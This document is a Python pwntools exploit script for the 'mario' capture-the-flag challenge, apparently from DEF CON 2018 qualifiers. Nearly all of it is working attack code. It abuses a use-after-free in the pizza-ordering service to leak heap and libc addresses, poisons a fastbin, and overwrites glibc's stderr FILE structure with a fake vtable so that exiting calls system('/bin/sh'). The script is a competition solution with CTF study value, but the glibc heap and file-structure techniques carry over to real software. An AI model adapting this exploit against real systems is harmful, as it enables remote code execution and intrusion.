#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "83b1db91.quals2018.oooverflow.io"
PORT = 31337

def solve_pow():
	r.recvuntil("Challenge: ")
	chall = r.recvline().strip()
	r.recvuntil("n: ")
	n = r.recvline().strip()
	r.recvuntil("Solution: ")

	pow = process(["./pow.py", chall, n])
	pow.recvline()
	pow.recvuntil("Solution: ")
	sol = pow.recvuntil(" ").strip()
	pow.close()
	r.sendline(sol)

def new_customer(name):
	r.sendline("N")
	r.sendlineafter("name? ", name)

	r.recvuntil("Welcome ")
	LEAK = r.recvuntil("\n----", drop=True)
	r.recvuntil("Choice: ")

	return LEAK

def order_pizza(count, ing ):
	r.sendline("O")
	r.sendlineafter("pizzas? ", str(count))

	for i in range(count):
		r.sendlineafter("ingredients? ", str(len(ing[i])))

		for ingredient in ing[i]:
			r.sendlineafter(": ", ingredient)

def cook_pizzas(note):
	r.sendline("C")
	r.sendlineafter("explain: ", note)
	LEAK = r.recvuntil("------------------- USER MENU -------------------")
	r.recvuntil("Choice")

	return LEAK

def login(user):
	r.sendline("L")
	r.sendlineafter("? ", user)
	r.recvuntil("Choice: ")

def leave():
	r.sendline("L")
	r.recvuntil("Choice: ")

def exploit(r):
	if not LOCAL:
		solve_pow()

	r.recvuntil("Choice: ")

	log.info("Create good user")

	new_customer("B"*200)
	leave()

	log.info("Create first offending user")

	new_customer("A"*200)

	log.info("Order pineapple pizzas to get this user banned")

	for i in range(16):
		order_pizza(1, [["\xf0\xff\xf0\x9f", "\x8d\x8d", "\xf0\x9f\x8d\x85"]])

	order_pizza(1, [["\xf0\x9f\x8d\x85"]])

	log.info("Cook offending pizza to free explanation buffer")
	cook_pizzas("X"*300)

	log.info("Withdraw to get heap leak from mario (from freed explanation)")

	r.sendline("Y")
	r.recvuntil("Choice: ")
	r.sendline("W")
	r.recvuntil("say: ")
	HEAPLEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))

	log.info("HEAPLEAK               : %s" % hex(HEAPLEAK))

	r.recvuntil("Choice: ")

	log.info("Create another offending user")

	new_customer("YAB")

	log.info("Order pineapple pizzas to get this user banned")

	for i in range(16):
		order_pizza(1, [["\xf0\xff\xf0\x9f", "\x8d\x8d", "\xf0\x9f\x8d\x85"]])

	order_pizza(1, [["\xf0\x9f\x8d\x85"]])

	log.info("Cook pizzas to create free fastbin chunk above user table")

	cook_pizzas("A"*(0x21-0x10))
	r.sendline("P")

	log.info("Overwrite user name (of YAB) with a pointer to a libc address on the heap")
	payload = p64(0x0) + p64(0)
	payload += p64(0x0) + p64(0x31)	
	payload += p64(HEAPLEAK - 0x1aa0) + p64(HEAPLEAK-0x1950)
	payload += p64(HEAPLEAK - 0x17d0) + p64(HEAPLEAK-0x210)
	payload += p64(0x0000000000000000) + p64(0x0000000000000051)	
	payload += p64(HEAPLEAK + 0x18)

	r.sendline(payload)

	log.info("Leak libc address from offending user")

	r.recvuntil("Choice: ")

	r.sendline("W")

	r.recvuntil("friend ")
	LIBCLEAK = u64(r.recvuntil(" ", drop=True).ljust(8, "\x00"))

	libc.address = LIBCLEAK - 216 - 0x10 - libc.symbols["__malloc_hook"]

	r.recvuntil("Choice: ")

	log.info("LIBC leak              : %s" % hex(LIBCLEAK))
	log.info("LIBC                   : %s" % hex(libc.address))

	log.info("Create another user and order offending pizzas")

	new_customer("WAITER")

	order_pizza(1, [["\xf0\xff\xf0\x9f", "\x8d\x8d", "\xf0\x9f\x8d\x85"]])
	leave()

	log.info("Login with first user (still good) and offend mario")
	login("B"*200)

	for i in range(16):
		order_pizza(1, [["\xf0\xff\xf0\x9f", "\x8d\x8d", "\xf0\x9f\x8d\x85"]])

	order_pizza(1, [["\xf0\x9f\x8d\x85"]])

	cook_pizzas("A"*(0x70-0x10))
	
	log.info("Explanation buffer points to currently freed fastbin. Overwrite FD pointer to point above stderr _IO_file structure.")

	r.sendline("P")

	# Misaligned pointer into _nl_global_locale

	"""
	0x7ffff783a4fd <_nl_global_locale+221>:	0xfff760395700007f	0x000000000000007f
	0x7ffff783a50d:	0x0000000000000000	0x0000000000000000
	0x7ffff783a51d:	0xfff783a540000000	0x000000000000007f
	0x7ffff783a52d:	0x0000000000000000	0x0000000000000000
	0x7ffff783a53d:	0x00fbad2087000000	0xfff783a5c3000000
	0x7ffff783a54d <_IO_2_1_stderr_+13>:	0xfff783a5c300007f	0xfff783a5c300007f
	0x7ffff783a55d <_IO_2_1_stderr_+29>:	0xfff783a5c300007f	0xfff783a5c300007f
	"""

	r.sendline(p64(libc.address + 0x3c54fd))

	log.info("Create another customer and cook a pizza to allocate 0x70 fastbin to get fake FD pointer into fastbin list")

	new_customer("A"*50)
	cook_pizzas("A"*(0x70-0x10))
	leave()
	
	log.info("Login with user waiting with offending order")	

	login("WAITER")

	log.info("Cook offending order. This will alocate pointer to stderr and overwrite it with As")

	cook_pizzas("A"*(0x70-0x10))

	log.info("Use explanation to overwrite stderr _IO_file")
	
	r.sendline("P")

	payload = "A"*19
	payload += p64(libc.address + 0x3c5540) + p64(0x0)
	payload += p64(0x0) + p64(0x0)
	payload += "/bin/sh\x00" + p64(1)							# flags
	payload += p64(2) + p64(3)
	payload += p64(4) + p64(5)
	payload += p64(6) + p64(7)
	payload += p64(8) + p64(0)
	payload += p64(0x0) + p64(0x0)
	payload += p64(0x0) + p64(0x0)								# fake vtable
	payload += p64(0x0) + p64(0xffffffffffffffff)
	payload += p64(0x0) + p64(libc.address + 0x3c6790)
	payload += p64(0xffffffffffffffff) + p64(0)
	payload += p64(libc.address + 0x3c49c0) + p64(0)
	payload += p64(0x0) + p64(0x0)
	payload += p64(0x0) + p64(libc.symbols["system"])			
	payload += p64(0x0) + p64(libc.address + 0x3c5608 - 0x60)	# fake vtable pointer

	r.sendline(payload)
	
	log.info("Call exit to trigger _IO_flush which will call fake vtable+0x60 => system('/bin/sh')")

	r.recvuntil("Choice: ")
	r.sendline("E")

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./mario")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		#r = process("./mario", env={"LD_PRELOAD" : "./libc.so.6"})		
		r = process("./mario")		
		print util.proc.pidof(r)
		pause()
		exploit(r)
